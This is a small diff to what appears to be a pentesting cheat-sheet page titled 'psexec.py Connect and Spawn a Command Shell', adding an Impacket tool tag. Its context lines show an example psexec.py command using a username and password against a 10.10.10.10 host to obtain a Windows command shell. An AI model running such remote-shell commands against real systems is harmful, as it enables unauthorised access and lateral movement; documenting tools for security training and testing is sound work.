@@ -34,6 +34,8 @@ output: 'root@kali:~# psexec.py Bob:secretpass@10.10.10.10
   C:\Windows\system32>'
 created_at: '2019-10-01T17:58:48.946488+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[Impacket]]'
 ---
 
 # psexec.py Connect and Spawn a Command Shell
